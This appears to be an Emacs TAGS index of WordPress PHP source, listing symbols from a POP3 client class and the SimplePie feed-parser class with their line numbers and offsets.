        $buffer = $this->BUFFER;buffer353,11821
        $cmd = "RETR $msgNum";cmd354,11854
        $reply = $this->send_cmd($cmd);reply355,11885
            $this->ERROR = "POP3 get: " . _("Error ") . "[$reply]";ERROR359,11970
        $count = 0;count363,12075
        $MsgArray = array();MsgArray364,12095
        $line = fgets($fp,$buffer);line366,12125
            if ( $line{0} == '.' ) { $line = substr($line,1); }line369,12219
            $line = fgets($fp,$buffer);line372,12344
    function last ( $type = "count" ) {last378,12470
    function last ( $type = "count" ) {type378,12470
        $last = -1;last383,12702
            $this->ERROR = "POP3 last: " . _("No connection to server");ERROR386,12762
        $reply = $this->send_cmd("STAT");reply390,12872
            $this->ERROR = "POP3 last: " . _("Error ") . "[$reply]";ERROR393,12958
        $Vars = preg_split('/\s+/',$reply);Vars397,13064
        $count = $Vars[1];count398,13108
        $size = $Vars[2];size399,13135
    function reset () {reset409,13349
            $this->ERROR = "POP3 reset: " . _("No connection to server");ERROR416,13619
        $reply = $this->send_cmd("RSET");reply419,13729
            $this->ERROR = "POP3 reset: " . _("Error ") . "[$reply]";ERROR426,13970
    function send_cmd ( $cmd = "" )send_cmd433,14157
    function send_cmd ( $cmd = "" )cmd433,14157
            $this->ERROR = "POP3 send_cmd: " . _("No connection to server");ERROR450,14809
            $this->ERROR = "POP3 send_cmd: " . _("Empty command string");ERROR456,14957
        $fp = $this->FP;fp460,15065
        $buffer = $this->BUFFER;buffer461,15090
        $reply = fgets($fp,$buffer);reply464,15186
        $reply = $this->strip_clf($reply);reply465,15223
    function quit() {quit470,15372
            $this->ERROR = "POP3 quit: " . _("connection does not exist");ERROR476,15538
        $fp = $this->FP;fp479,15649
        $cmd = "QUIT";cmd480,15674
        $reply = fgets($fp,$this->BUFFER);reply482,15729
        $reply = $this->strip_clf($reply);reply483,15772
    function popstat () {popstat490,15966
        $PopArray = $this->last("array");PopArray494,16130
    function uidl ($msgNum = "")uidl505,16348
            $this->ERROR = "POP3 uidl: " . _("No connection to server");ERROR513,16692
        $fp = $this->FP;fp517,16802
        $buffer = $this->BUFFER;buffer518,16827
            $cmd = "UIDL $msgNum";cmd521,16891
            $reply = $this->send_cmd($cmd);reply522,16926
                $this->ERROR = "POP3 uidl: " . _("Error ") . "[$reply]";ERROR525,17022
            $UIDLArray = array();UIDLArray533,17286
            $Total = $this->COUNT;Total534,17320
            $cmd = "UIDL";cmd541,17483
            $reply = fgets($fp, $buffer);reply543,17547
            $reply = $this->strip_clf($reply);reply544,17589
                $this->ERROR = "POP3 uidl: " . _("Error ") . "[$reply]";ERROR548,17768
            $line = "";line552,17886
            $count = 1;count553,17910
            $line = fgets($fp,$buffer);line554,17934
                $msgUidl = $this->strip_clf($msgUidl);msgUidl557,18094
                $line = fgets($fp,$buffer);line566,18388
    function delete ($msgNum = "") {delete572,18490
            $this->ERROR = "POP3 delete: " . _("No connection to server");ERROR578,18687
            $this->ERROR = "POP3 delete: " . _("No msg number submitted");ERROR583,18835
        $reply = $this->send_cmd("DELE $msgNum");reply586,18946
            $this->ERROR = "POP3 delete: " . _("Command failed ") . "[$reply]";ERROR589,19040
    function is_ok ($cmd = "") {is_ok599,19309
    function strip_clf ($text = "") {strip_clf608,19517
            $stripped = str_replace(array("\r","\n"),'',$text);stripped614,19667
    function parse_banner ( $server_text ) {parse_banner619,19778
        $outside = true;outside620,19823
        $banner = "";banner621,19848
        $length = strlen($server_text);length622,19870
            $digit = substr($server_text,$count,1);digit625,19971
                    $outside = false;outside633,20268
                    $outside = true;outside637,20376
        $banner = $this->strip_clf($banner);    // Just in casebanner641,20455
    function stripos($haystack, $needle){stripos649,20633

wordpress/wp-includes/class-simplepie.php,195086
define('SIMPLEPIE_NAME', 'SimplePie');SIMPLEPIE_NAME51,2272
define('SIMPLEPIE_VERSION', '1.2.1');SIMPLEPIE_VERSION56,2341
define('SIMPLEPIE_BUILD', '20111015034325');SIMPLEPIE_BUILD61,2407
define('SIMPLEPIE_URL', 'http://simplepie.org');SIMPLEPIE_URL66,2486
define('SIMPLEPIE_USERAGENT', SIMPLEPIE_NAME . '/' . SIMPLEPIE_VERSION . ' (Feed Parser; ' . SIMPLEPIE_URL . '; Allow like Gecko) Build/' . SIMPLEPIE_BUILD);SIMPLEPIE_USERAGENT72,2602
define('SIMPLEPIE_LINKBACK', '<a href="' . SIMPLEPIE_URL . '" title="' . SIMPLEPIE_NAME . ' ' . SIMPLEPIE_VERSION . '">' . SIMPLEPIE_NAME . '</a>');SIMPLEPIE_LINKBACK77,2791
define('SIMPLEPIE_LOCATOR_NONE', 0);SIMPLEPIE_LOCATOR_NONE83,3014
define('SIMPLEPIE_LOCATOR_AUTODISCOVERY', 1);SIMPLEPIE_LOCATOR_AUTODISCOVERY89,3140
define('SIMPLEPIE_LOCATOR_LOCAL_EXTENSION', 2);SIMPLEPIE_LOCATOR_LOCAL_EXTENSION95,3278
define('SIMPLEPIE_LOCATOR_LOCAL_BODY', 4);SIMPLEPIE_LOCATOR_LOCAL_BODY101,3413
define('SIMPLEPIE_LOCATOR_REMOTE_EXTENSION', 8);SIMPLEPIE_LOCATOR_REMOTE_EXTENSION107,3549
define('SIMPLEPIE_LOCATOR_REMOTE_BODY', 16);SIMPLEPIE_LOCATOR_REMOTE_BODY113,3686
define('SIMPLEPIE_LOCATOR_ALL', 31);SIMPLEPIE_LOCATOR_ALL119,3811
define('SIMPLEPIE_TYPE_NONE', 0);SIMPLEPIE_TYPE_NONE124,3879
define('SIMPLEPIE_TYPE_RSS_090', 1);SIMPLEPIE_TYPE_RSS_090129,3934
define('SIMPLEPIE_TYPE_RSS_091_NETSCAPE', 2);SIMPLEPIE_TYPE_RSS_091_NETSCAPE134,4003
define('SIMPLEPIE_TYPE_RSS_091_USERLAND', 4);SIMPLEPIE_TYPE_RSS_091_USERLAND139,4081
define('SIMPLEPIE_TYPE_RSS_091', 6);SIMPLEPIE_TYPE_RSS_091144,4177
define('SIMPLEPIE_TYPE_RSS_092', 8);SIMPLEPIE_TYPE_RSS_092149,4235
define('SIMPLEPIE_TYPE_RSS_093', 16);SIMPLEPIE_TYPE_RSS_093154,4293
define('SIMPLEPIE_TYPE_RSS_094', 32);SIMPLEPIE_TYPE_RSS_094159,4352
define('SIMPLEPIE_TYPE_RSS_10', 64);SIMPLEPIE_TYPE_RSS_10164,4410
define('SIMPLEPIE_TYPE_RSS_20', 128);SIMPLEPIE_TYPE_RSS_20169,4467
define('SIMPLEPIE_TYPE_RSS_RDF', 65);SIMPLEPIE_TYPE_RSS_RDF174,4531
define('SIMPLEPIE_TYPE_RSS_SYNDICATION', 190);SIMPLEPIE_TYPE_RSS_SYNDICATION179,4638
define('SIMPLEPIE_TYPE_RSS_ALL', 255);SIMPLEPIE_TYPE_RSS_ALL184,4705
define('SIMPLEPIE_TYPE_ATOM_03', 256);SIMPLEPIE_TYPE_ATOM_03189,4765
define('SIMPLEPIE_TYPE_ATOM_10', 512);SIMPLEPIE_TYPE_ATOM_10194,4825
define('SIMPLEPIE_TYPE_ATOM_ALL', 768);SIMPLEPIE_TYPE_ATOM_ALL199,4885
define('SIMPLEPIE_TYPE_ALL', 1023);SIMPLEPIE_TYPE_ALL204,4952
define('SIMPLEPIE_CONSTRUCT_NONE', 0);SIMPLEPIE_CONSTRUCT_NONE209,5013
define('SIMPLEPIE_CONSTRUCT_TEXT', 1);SIMPLEPIE_CONSTRUCT_TEXT214,5079
define('SIMPLEPIE_CONSTRUCT_HTML', 2);SIMPLEPIE_CONSTRUCT_HTML219,5145
define('SIMPLEPIE_CONSTRUCT_XHTML', 4);SIMPLEPIE_CONSTRUCT_XHTML224,5212
define('SIMPLEPIE_CONSTRUCT_BASE64', 8);SIMPLEPIE_CONSTRUCT_BASE64229,5289
define('SIMPLEPIE_CONSTRUCT_IRI', 16);SIMPLEPIE_CONSTRUCT_IRI234,5356
define('SIMPLEPIE_CONSTRUCT_MAYBE_HTML', 32);SIMPLEPIE_CONSTRUCT_MAYBE_HTML239,5438
define('SIMPLEPIE_CONSTRUCT_ALL', 63);SIMPLEPIE_CONSTRUCT_ALL244,5511
define('SIMPLEPIE_SAME_CASE', 1);SIMPLEPIE_SAME_CASE249,5580
define('SIMPLEPIE_LOWERCASE', 2);SIMPLEPIE_LOWERCASE254,5646
define('SIMPLEPIE_UPPERCASE', 4);SIMPLEPIE_UPPERCASE259,5712
define('SIMPLEPIE_PCRE_HTML_ATTRIBUTE', '((?:[\x09\x0A\x0B\x0C\x0D\x20]+[^\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E][^\x09\x0A\x0B\x0C\x0D\x20\x2F\x3D\x3E]*(?:[\x09\x0A\x0B\x0C\x0D\x20]*=[\x09\x0A\x0B\x0C\x0D\x20]*(?:"(?:[^"]*)"|\'(?:[^\']*)\'|(?:[^\x09\x0A\x0B\x0C\x0D\x20\x22\x27\x3E][^\x09\x0A\x0B\x0C\x0D\x20\x3E]*)?))?)*)[\x09\x0A\x0B\x0C\x0D\x20]*');SIMPLEPIE_PCRE_HTML_ATTRIBUTE264,5783
define('SIMPLEPIE_PCRE_XML_ATTRIBUTE', '((?:\s+(?:(?:[^\s:]+:)?[^\s:]+)\s*=\s*(?:"(?:[^"]*)"|\'(?:[^\']*)\'))*)\s*');SIMPLEPIE_PCRE_XML_ATTRIBUTE269,6167
define('SIMPLEPIE_NAMESPACE_XML', 'http://www.w3.org/XML/1998/namespace');SIMPLEPIE_NAMESPACE_XML274,6311
define('SIMPLEPIE_NAMESPACE_ATOM_10', 'http://www.w3.org/2005/Atom');SIMPLEPIE_NAMESPACE_ATOM_10279,6417
define('SIMPLEPIE_NAMESPACE_ATOM_03', 'http://purl.org/atom/ns#');SIMPLEPIE_NAMESPACE_ATOM_03284,6518
define('SIMPLEPIE_NAMESPACE_RDF', 'http://www.w3.org/1999/02/22-rdf-syntax-ns#');SIMPLEPIE_NAMESPACE_RDF289,6611
define('SIMPLEPIE_NAMESPACE_RSS_090', 'http://my.netscape.com/rdf/simple/0.9/');SIMPLEPIE_NAMESPACE_RSS_090294,6724
define('SIMPLEPIE_NAMESPACE_RSS_10', 'http://purl.org/rss/1.0/');SIMPLEPIE_NAMESPACE_RSS_10299,6835
define('SIMPLEPIE_NAMESPACE_RSS_10_MODULES_CONTENT', 'http://purl.org/rss/1.0/modules/content/');SIMPLEPIE_NAMESPACE_RSS_10_MODULES_CONTENT304,6946
define('SIMPLEPIE_NAMESPACE_RSS_20', '');SIMPLEPIE_NAMESPACE_RSS_20310,7153
define('SIMPLEPIE_NAMESPACE_DC_10', 'http://purl.org/dc/elements/1.0/');SIMPLEPIE_NAMESPACE_DC_10315,7224
define('SIMPLEPIE_NAMESPACE_DC_11', 'http://purl.org/dc/elements/1.1/');SIMPLEPIE_NAMESPACE_DC_11320,7326
define('SIMPLEPIE_NAMESPACE_W3C_BASIC_GEO', 'http://www.w3.org/2003/01/geo/wgs84_pos#');SIMPLEPIE_NAMESPACE_W3C_BASIC_GEO325,7463
define('SIMPLEPIE_NAMESPACE_GEORSS', 'http://www.georss.org/georss');SIMPLEPIE_NAMESPACE_GEORSS330,7581
define('SIMPLEPIE_NAMESPACE_MEDIARSS', 'http://search.yahoo.com/mrss/');SIMPLEPIE_NAMESPACE_MEDIARSS335,7683
define('SIMPLEPIE_NAMESPACE_MEDIARSS_WRONG', 'http://search.yahoo.com/mrss');SIMPLEPIE_NAMESPACE_MEDIARSS_WRONG340,7794
define('SIMPLEPIE_NAMESPACE_ITUNES', 'http://www.itunes.com/dtds/podcast-1.0.dtd');SIMPLEPIE_NAMESPACE_ITUNES345,7905
define('SIMPLEPIE_NAMESPACE_XHTML', 'http://www.w3.org/1999/xhtml');SIMPLEPIE_NAMESPACE_XHTML350,8017
define('SIMPLEPIE_IANA_LINK_RELATIONS_REGISTRY', 'http://www.iana.org/assignments/relation/');SIMPLEPIE_IANA_LINK_RELATIONS_REGISTRY355,8127
define('SIMPLEPIE_PHP5', version_compare(PHP_VERSION, '5.0.0', '>='));SIMPLEPIE_PHP5360,8264
define('SIMPLEPIE_FILE_SOURCE_NONE', 0);SIMPLEPIE_FILE_SOURCE_NONE365,8362
define('SIMPLEPIE_FILE_SOURCE_REMOTE', 1);SIMPLEPIE_FILE_SOURCE_REMOTE370,8434
define('SIMPLEPIE_FILE_SOURCE_LOCAL', 2);SIMPLEPIE_FILE_SOURCE_LOCAL375,8507
define('SIMPLEPIE_FILE_SOURCE_FSOCKOPEN', 4);SIMPLEPIE_FILE_SOURCE_FSOCKOPEN380,8585
define('SIMPLEPIE_FILE_SOURCE_CURL', 8);SIMPLEPIE_FILE_SOURCE_CURL385,8660
define('SIMPLEPIE_FILE_SOURCE_FILE_GET_CONTENTS', 16);SIMPLEPIE_FILE_SOURCE_FILE_GET_CONTENTS390,8745
class SimplePieSimplePie397,8847
	var $data = array();data403,8919
	var $data = array();data403,8919
	var $error;error409,9000
	var $sanitize;sanitize416,9149
	var $useragent = SIMPLEPIE_USERAGENT;useragent423,9268
	var $useragent = SIMPLEPIE_USERAGENT;useragent423,9268
	var $feed_url;feed_url430,9398
	var $file;file437,9536
	var $raw_data;raw_data444,9644
	var $timeout = 10;timeout451,9772
	var $timeout = 10;timeout451,9772
	var $force_fsockopen = false;force_fsockopen459,9985
	var $force_fsockopen = false;force_fsockopen459,9985
	var $force_feed = false;force_feed467,10178
	var $force_feed = false;force_feed467,10178
	var $xml_dump = false;xml_dump474,10311
	var $xml_dump = false;xml_dump474,10311
	var $cache = true;cache481,10438
	var $cache = true;cache481,10438
	var $cache_duration = 3600;cache_duration488,10571
	var $cache_duration = 3600;cache_duration488,10571
	var $autodiscovery_cache_duration = 604800; // 7 Days.autodiscovery_cache_duration495,10742
	var $autodiscovery_cache_duration = 604800; // 7 Days.autodiscovery_cache_duration495,10742
	var $cache_location = './cache';cache_location502,10932
	var $cache_location = './cache';cache_location502,10932
	var $cache_name_function = 'md5';cache_name_function509,11100
	var $cache_name_function = 'md5';cache_name_function509,11100
	var $order_by_date = true;order_by_date516,11255
	var $order_by_date = true;order_by_date516,11255
	var $input_encoding = false;input_encoding524,11488
	var $input_encoding = false;input_encoding524,11488
	var $autodiscovery = SIMPLEPIE_LOCATOR_ALL;autodiscovery531,11633
	var $autodiscovery = SIMPLEPIE_LOCATOR_ALL;autodiscovery531,11633
	var $cache_class = 'SimplePie_Cache';cache_class538,11792
	var $cache_class = 'SimplePie_Cache';cache_class538,11792
	var $locator_class = 'SimplePie_Locator';locator_class545,11948
	var $locator_class = 'SimplePie_Locator';locator_class545,11948
	var $parser_class = 'SimplePie_Parser';parser_class552,12106
	var $parser_class = 'SimplePie_Parser';parser_class552,12106
	var $file_class = 'SimplePie_File';file_class559,12261
	var $file_class = 'SimplePie_File';file_class559,12261
	var $item_class = 'SimplePie_Item';item_class566,12403
	var $item_class = 'SimplePie_Item';item_class566,12403
	var $author_class = 'SimplePie_Author';author_class573,12549
	var $author_class = 'SimplePie_Author';author_class573,12549
	var $category_class = 'SimplePie_Category';category_class580,12704
	var $category_class = 'SimplePie_Category';category_class580,12704
	var $enclosure_class = 'SimplePie_Enclosure';enclosure_class587,12865
	var $enclosure_class = 'SimplePie_Enclosure';enclosure_class587,12865
	var $caption_class = 'SimplePie_Caption';caption_class594,13046
	var $caption_class = 'SimplePie_Caption';caption_class594,13046
	var $copyright_class = 'SimplePie_Copyright';copyright_class601,13221
	var $copyright_class = 'SimplePie_Copyright';copyright_class601,13221
	var $credit_class = 'SimplePie_Credit';credit_class608,13394
	var $credit_class = 'SimplePie_Credit';credit_class608,13394
	var $rating_class = 'SimplePie_Rating';rating_class615,13561
	var $rating_class = 'SimplePie_Rating';rating_class615,13561
	var $restriction_class = 'SimplePie_Restriction';restriction_class622,13738
	var $restriction_class = 'SimplePie_Restriction';restriction_class622,13738
	var $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer';content_type_sniffer_class629,13926
	var $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer';content_type_sniffer_class629,13926
	var $source_class = 'SimplePie_Source';source_class636,14110
	var $source_class = 'SimplePie_Source';source_class636,14110
	var $javascript = 'js';javascript644,14339
	var $javascript = 'js';javascript644,14339
	var $max_checked_feeds = 10;max_checked_feeds651,14504
	var $max_checked_feeds = 10;max_checked_feeds651,14504
	var $all_discovered_feeds = array();all_discovered_feeds658,14680
	var $all_discovered_feeds = array();all_discovered_feeds658,14680
	var $favicon_handler = '';favicon_handler665,14860
	var $favicon_handler = '';favicon_handler665,14860
	var $image_handler = '';image_handler672,15026
	var $image_handler = '';image_handler672,15026
	var $multifeed_url = array();multifeed_url679,15192
	var $multifeed_url = array();multifeed_url679,15192
	var $multifeed_objects = array();multifeed_objects685,15327
	var $multifeed_objects = array();multifeed_objects685,15327
	var $config_settings = null;config_settings692,15503
	var $config_settings = null;config_settings692,15503
	var $item_limit = 0;item_limit699,15681
	var $item_limit = 0;item_limit699,15681
	var $strip_attributes = array('bgsound', 'class', 'expr', 'id', 'style', 'onclick', 'onerror', 'onfinish', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'lowsrc', 'dynsrc');strip_attributes706,15856
	var $strip_attributes = array('bgsound', 'class', 'expr', 'id', 'style', 'onclick', 'onerror', 'onfinish', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'lowsrc', 'dynsrc');strip_attributes706,15856
	var $strip_htmltags = array('base', 'blink', 'body', 'doctype', 'embed', 'font', 'form', 'frame', 'frameset', 'html', 'iframe', 'input', 'marquee', 'meta', 'noscript', 'object', 'param', 'script', 'style');strip_htmltags713,16178
	var $strip_htmltags = array('base', 'blink', 'body', 'doctype', 'embed', 'font', 'form', 'frame', 'frameset', 'html', 'iframe', 'input', 'marquee', 'meta', 'noscript', 'object', 'param', 'script', 'style');strip_htmltags713,16178
	 * The SimplePie class contains feed level data and optionscontains716,16392
	function SimplePie($feed_url = null, $cache_location = null, $cache_duration = null)SimplePie736,17485
	function SimplePie($feed_url = null, $cache_location = null, $cache_duration = null)cache_location736,17485
		$this->sanitize =& new SimplePie_Sanitize;sanitize739,17647
	function __toString()__toString763,18120
	function __destruct()__destruct771,18268
	function force_feed($enable = false)force_feed802,18987
		$this->force_feed = (bool) $enable;force_feed804,19028
	function set_feed_url($url)set_feed_url823,19678
			$this->multifeed_url = array();multifeed_url827,19736
			$this->feed_url = SimplePie_Misc::fix_protocol($url, 1);feed_url835,19894
	function set_file(&$file)set_file846,20172
			$this->feed_url = $file->url;feed_url850,20243
			$this->file =& $file;file851,20276
	function set_raw_data($data)set_raw_data869,20734
		$this->raw_data = $data;raw_data871,20767
	function set_timeout($timeout = 10)set_timeout884,21126
		$this->timeout = (int) $timeout;timeout886,21166
	function force_fsockopen($enable = false)force_fsockopen897,21398
		$this->force_fsockopen = (bool) $enable;force_fsockopen899,21444
	 * Used only for debugging, this function will output the XML content aswill906,21596
	function enable_xml_dump($enable = false)enable_xml_dump917,22106
		$this->xml_dump = (bool) $enable;xml_dump919,22152
	function enable_cache($enable = true)enable_cache932,22479
		$this->cache = (bool) $enable;cache934,22521
	function set_cache_duration($seconds = 3600)set_cache_duration944,22736
		$this->cache_duration = (int) $seconds;cache_duration946,22785
	function set_autodiscovery_cache_duration($seconds = 604800)set_autodiscovery_cache_duration956,23025
		$this->autodiscovery_cache_duration = (int) $seconds;autodiscovery_cache_duration958,23090
	function set_cache_location($location = './cache')set_cache_location967,23311
		$this->cache_location = (string) $location;cache_location969,23366
	function enable_order_by_date($enable = true)enable_order_by_date978,23595
		$this->order_by_date = (bool) $enable;order_by_date980,23645
	function set_input_encoding($encoding = false)set_input_encoding989,23843
			$this->input_encoding = (string) $encoding;input_encoding993,23915
			$this->input_encoding = false;input_encoding997,23977
	function set_autodiscovery_level($level = SIMPLEPIE_LOCATOR_ALL)set_autodiscovery_level1015,24490
		$this->autodiscovery = (int) $level;autodiscovery1017,24559
	 * Allows you to change which class SimplePie uses for caching.SimplePie1021,24607
	function set_cache_class($class = 'SimplePie_Cache')set_cache_class1029,25021
			$this->cache_class = $class;cache_class1033,25147
	 * Allows you to change which class SimplePie uses for auto-discovery.SimplePie1040,25224
	function set_locator_class($class = 'SimplePie_Locator')set_locator_class1048,25645
			$this->locator_class = $class;locator_class1052,25777
	 * Allows you to change which class SimplePie uses for XML parsing.SimplePie1059,25856
	function set_parser_class($class = 'SimplePie_Parser')set_parser_class1067,26274
			$this->parser_class = $class;parser_class1071,26403
	 * Allows you to change which class SimplePie uses for remote file fetching.SimplePie1078,26481
	function set_file_class($class = 'SimplePie_File')set_file_class1086,26908
			$this->file_class = $class;file_class1090,27031
	 * Allows you to change which class SimplePie uses for data sanitization.SimplePie1097,27107
	function set_sanitize_class($class = 'SimplePie_Sanitize')set_sanitize_class1105,27531
			$this->sanitize =& new $class;sanitize1109,27666
	 * Allows you to change which class SimplePie uses for handling feed items.SimplePie1116,27745
	function set_item_class($class = 'SimplePie_Item')set_item_class1124,28171
			$this->item_class = $class;item_class1128,28294
	 * Allows you to change which class SimplePie uses for handling author data.SimplePie1135,28370
	function set_author_class($class = 'SimplePie_Author')set_author_class1143,28797
			$this->author_class = $class;author_class1147,28926
	 * Allows you to change which class SimplePie uses for handling category data.SimplePie1154,29004
	function set_category_class($class = 'SimplePie_Category')set_category_class1162,29433
			$this->category_class = $class;category_class1166,29568
	 * Allows you to change which class SimplePie uses for feed enclosures.SimplePie1173,29648
	function set_enclosure_class($class = 'SimplePie_Enclosure')set_enclosure_class1181,30070
			$this->enclosure_class = $class;enclosure_class1185,30208
	 * Allows you to change which class SimplePie uses for <media:text> captionsSimplePie1192,30289
	function set_caption_class($class = 'SimplePie_Caption')set_caption_class1200,30716
			$this->caption_class = $class;caption_class1204,30848
	 * Allows you to change which class SimplePie uses for <media:copyright>SimplePie1211,30927
	function set_copyright_class($class = 'SimplePie_Copyright')set_copyright_class1219,31350
			$this->copyright_class = $class;copyright_class1223,31488
	 * Allows you to change which class SimplePie uses for <media:credit>SimplePie1230,31569
	function set_credit_class($class = 'SimplePie_Credit')set_credit_class1238,31989
			$this->credit_class = $class;credit_class1242,32118
	 * Allows you to change which class SimplePie uses for <media:rating>SimplePie1249,32196
	function set_rating_class($class = 'SimplePie_Rating')set_rating_class1257,32616
			$this->rating_class = $class;rating_class1261,32745
	 * Allows you to change which class SimplePie uses for <media:restriction>SimplePie1268,32823
	function set_restriction_class($class = 'SimplePie_Restriction')set_restriction_class1276,33248
			$this->restriction_class = $class;restriction_class1280,33392
	 * Allows you to change which class SimplePie uses for content-type sniffing.SimplePie1287,33475
	function set_content_type_sniffer_class($class = 'SimplePie_Content_Type_Sniffer')set_content_type_sniffer_class1295,33903
			$this->content_type_sniffer_class = $class;content_type_sniffer_class1299,34074
	 * Allows you to change which class SimplePie uses item sources.SimplePie1306,34166
	function set_source_class($class = 'SimplePie_Source')set_source_class1314,34581
			$this->source_class = $class;source_class1318,34710
	function set_useragent($ua = SIMPLEPIE_USERAGENT)set_useragent1330,34919
		$this->useragent = (string) $ua;useragent1332,34973
	 * Set callback function to create cache filename withto1336,35017
	function set_cache_name_function($function = 'md5')set_cache_name_function1341,35146
			$this->cache_name_function = $function;cache_name_function1345,35236
	function set_javascript($get = 'js')set_javascript1355,35418
			$this->javascript = (string) $get;javascript1359,35475
			$this->javascript = false;javascript1363,35528
	function set_stupidly_fast($set = false)set_stupidly_fast1374,35769
	function set_max_checked_feeds($max = 10)set_max_checked_feeds1393,36189
		$this->max_checked_feeds = (int) $max;max_checked_feeds1395,36235
	function remove_div($enable = true)remove_div1398,36280
	function strip_htmltags($tags = '', $encode = null)strip_htmltags1403,36364
	function strip_htmltags($tags = '', $encode = null)encode1403,36364
			$tags = $this->strip_htmltags;tags1407,36444
	function encode_instead_of_strip($enable = true)encode_instead_of_strip1416,36612
	function strip_attributes($attribs = '')strip_attributes1421,36722
			$attribs = $this->strip_attributes;attribs1425,36794
	function set_output_encoding($encoding = 'UTF-8')set_output_encoding1430,36888
	function strip_comments($strip = false)strip_comments1435,36997
	function set_url_replacements($element_attribute = array('a' => 'href', 'area' => 'href', 'blockquote' => 'cite', 'del' => 'cite', 'form' => 'action', 'img' => array('longdesc', 'src'), 'input' => 'src', 'ins' => 'cite', 'q' => 'cite'))set_url_replacements1448,37333
	function set_favicon_handler($page = false, $qs = 'i')set_favicon_handler1460,37880
	function set_favicon_handler($page = false, $qs = 'i')qs1460,37880
			$this->favicon_handler = $page . '?' . $qs . '=';favicon_handler1464,37966
			$this->favicon_handler = '';favicon_handler1468,38034
	function set_image_handler($page = false, $qs = 'i')set_image_handler1479,38311
	function set_image_handler($page = false, $qs = 'i')qs1479,38311
			$this->image_handler = '';image_handler1487,38474
	function set_item_limit($limit = 0)set_item_limit1497,38673
		$this->item_limit = (int) $limit;item_limit1499,38713
	function init()init1502,38753
			static $xml_is_sane = null;xml_is_sane1512,39191
			static $xml_is_sane = null;xml_is_sane1512,39191
				$parser_check = xml_parser_create();parser_check1515,39257
				$xml_is_sane = isset($values[0]['value']);xml_is_sane1518,39405
			$this->data = array();data1538,39977
			$this->multifeed_objects = array();multifeed_objects1539,40003
			$cache = false;cache1540,40042
				$parsed_feed_url = SimplePie_Misc::parse_url($this->feed_url);parsed_feed_url1544,40100
					$cache = call_user_func(array($this->cache_class, 'create'), $this->cache_location, call_user_func($this->cache_name_function, $this->feed_url), 'spc');cache1548,40272
					$this->data = $cache->load();data1554,40569
							$this->data = array();data1561,40818
							$cache = false;cache1566,41017
							$this->data = array();data1567,41040
									$this->data = array();data1579,41538
								$headers = array();headers1594,41993
								$file =& new $this->file_class($this->feed_url, $this->timeout/10, 5, $headers, $this->useragent, $this->force_fsockopen);file1603,42335
										$headers = $file->headers;headers1613,42642
						$this->data = array();data1632,42964
						$file =& $this->file;file1640,43257
						$file =& new $this->file_class($this->feed_url, $this->timeout, 5, null, $this->useragent, $this->force_fsockopen);file1644,43309
					$this->error = $file->error;error1650,43702
					$locate =& new $this->locator_class($file, $this->timeout, $this->useragent, $this->file_class, $this->max_checked_feeds, $this->content_type_sniffer_class);locate1664,43955
								$this->data = array('url' => $this->feed_url, 'feed_url' => $file->url, 'build' => SIMPLEPIE_BUILD);data1673,44405
								$cache = call_user_func(array($this->cache_class, 'create'), $this->cache_location, call_user_func($this->cache_name_function, $file->url), 'spc');cache1678,44753
							$this->feed_url = $file->url;feed_url1680,44918
							$this->error = "A feed could not be found at $this->feed_url. A feed with an invalid mime type may fall victim to this error, or " . SIMPLEPIE_NAME . " was unable to auto-discover it.. Use force_feed() if you are certain this URL is a real feed.";error1684,44982
					$locate = null;locate1689,45352
				$headers = $file->headers;headers1692,45380
				$data = $file->body;data1693,45411
				$sniffer =& new $this->content_type_sniffer_class($file);sniffer1694,45436
				$sniffed = $sniffer->get_type();sniffed1695,45498
				$data = $this->raw_data;data1699,45553
			$encodings = array();encodings1703,45629
			$application_types = array('application/xml', 'application/xml-dtd', 'application/xml-external-parsed-entity');application_types1711,45803
			$text_types = array('text/xml', 'text/xml-external-parsed-entity');text_types1712,45918
					$encodings = array_merge($encodings, SimplePie_Misc::xml_encoding($data));encodings1723,46383
			$encodings = array_merge($encodings, SimplePie_Misc::xml_encoding($data));encodings1742,47012
			$encodings = array_unique($encodings);encodings1747,47201
					$parser =& new $this->parser_class();parser1764,47775
						$this->data = $parser->get_data();data1769,47900
							$this->error = "A feed could not be found at $this->feed_url. This does not appear to be a valid RSS or Atom feed.";error1787,48477
				$this->error = sprintf('This XML document is invalid, likely due to invalid characters. XML error: %s at line %d, column %d', $parser->get_error_string(), $parser->get_current_line(), $parser->get_current_column());error1797,48826
				$this->error = 'The data could not be converted to UTF-8. You MUST have either the iconv or mbstring extension installed. Upgrading to PHP 5.x (which includes iconv) is highly recommended.';error1801,49064
			$i = 0;i1808,49404
			$success = 0;success1809,49415
			$this->multifeed_objects = array();multifeed_objects1810,49432
	function error()error1840,50050
	function get_encoding()get_encoding1845,50098
	function handle_content_type($mime = 'text/html')handle_content_type1850,50173
			$header = "Content-type: $mime;";header1854,50254
	function get_type()get_type1867,50462
	function get_favicon()get_favicon1954,53580
			$favicon = SimplePie_Misc::absolutize_url('/favicon.ico', $url);favicon1962,53886
				$favicon_filename = call_user_func($this->cache_name_function, $favicon);favicon_filename1966,54007
				$cache = call_user_func(array($this->cache_class, 'create'), $this->cache_location, $favicon_filename, 'spi');cache1967,54085
					$file =& new $this->file_class($favicon, $this->timeout / 10, 5, array('X-FORWARDED-FOR' => $_SERVER['REMOTE_ADDR']), $this->useragent, $this->force_fsockopen);file1975,54350
						$sniffer =& new $this->content_type_sniffer_class($file);sniffer1979,54720
	function subscribe_url()subscribe_url2013,55725
	function subscribe_feed()subscribe_feed2025,55898
	function subscribe_outlook()subscribe_outlook2037,56105
	function subscribe_podcast()subscribe_podcast2049,56327
	function subscribe_itunes()subscribe_itunes2061,56537
	function subscribe_service($feed_url, $site_url = null)subscribe_service2082,57038
	function subscribe_service($feed_url, $site_url = null)site_url2082,57038
			$return = $feed_url . rawurlencode($this->feed_url);return2086,57132
	function subscribe_aol()subscribe_aol2099,57415
	function subscribe_bloglines()subscribe_bloglines2104,57523
	function subscribe_eskobo()subscribe_eskobo2109,57630
	function subscribe_feedfeeds()subscribe_feedfeeds2114,57740
	function subscribe_feedster()subscribe_feedster2119,57852
	function subscribe_google()subscribe_google2124,58000
	function subscribe_gritwire()subscribe_gritwire2129,58112
	function subscribe_msn()subscribe_msn2134,58247
	function subscribe_netvibes()subscribe_netvibes2139,58371
	function subscribe_newsburst()subscribe_newsburst2144,58490
	function subscribe_newsgator()subscribe_newsgator2149,58605
	function subscribe_odeo()subscribe_odeo2154,58739
	function subscribe_podnova()subscribe_podnova2159,58854
